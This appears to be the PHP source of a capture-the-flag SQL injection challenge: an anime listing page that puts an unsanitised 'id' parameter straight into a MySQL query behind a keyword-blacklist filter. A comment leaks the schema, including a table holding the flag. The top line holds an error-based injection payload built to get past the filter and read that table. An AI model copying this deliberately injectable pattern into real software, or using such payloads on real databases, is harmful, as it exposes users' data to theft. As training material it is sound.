<?php
//id=extractvalue(1,concat(0x7e,(select+e.2+from+(select+1,2+union+select+*+from+secret)e+limit+1+offset+1),0x7e))
include("config.php");
header("Content-type: text/html; charset=utf-8");
?>

<html>
<head>
    <link href="./lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/dashboard.css" rel="stylesheet">
    <script src="./lib/jquery/jquery-3.3.1.min.js"></script>
    <script src="./lib/popper/popper.min.js"></script>
    <script src="./lib/bootstrap/js/bootstrap.js"></script>
</head>
<body>
<table class="table table-striped table-sm" border="1">
    <tr>
        <th>Id</th>
        <th>名字</th>
        <th>追番人数</th>
    </tr>
</body>
</html>

<!--
create table anime(
id varchar(100) primary key not null,
name varchar(200) not null,
rate int not null
)  ENGINE=MyISAM DEFAULT CHARSET=utf8;

create table secret(
id int primary key not null,
s3cret varchar(200) not null
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

insert into secret value(1,'HXCTF{************}');

function waf($id){
    $blackList = array("if","substr","substring","or","and","||","&&","s3cret","information_schema");

    if(strpos($_SERVER['HTTP_USER_AGENT'], 'mysql') !== false){
	die("502 Bad GateWay<br>HuaweiCloud Waf");
    }

    foreach ($blackList as $blackItem){
        if(strstr($id, $blackItem) !== false){
            die("502 Bad GateWay<br>HuaweiCloud Waf");
        }
    }

    return $id;
}

-->


<?php

function waf($id){
    $blackList = array("if","substr","substring","or","and","||","&&","s3cret","information_schema");

    if(stripos($_SERVER['HTTP_USER_AGENT'], 'mysql') !== false){
	die("502 Bad GateWay<br>HuaweiCloud Waf");
    }

    foreach ($blackList as $blackItem){
        if(stripos($id, $blackItem) !== false){
            die("502 Bad GateWay<br>HuaweiCloud Waf");
        }
    }

    return $id;
}

if(isset($_GET['id']) && $_GET['id'] !== ""){

    $id = waf($_GET['id']);

    $sql = "select * from anime where id={$id}";
    if(isset($_GET['debug']) && $_GET['debug'] === '1'){
        echo $sql;
    }
    $result = $mysqli->query($sql);

    if($result){
        while($row = mysqli_fetch_assoc($result)){
            echo "<tr>
            <td>{$row['id']}</td>
            <td>{$row['name']}</td>
            <td>{$row['rate']}万</td>
            <td><img src=/static/images/{$row['id']}.jpg width='100px' height='150px'></td>
            </tr>";
        }
        echo "</table>";
    }else{

        die($mysqli->error);
    }
}
?>
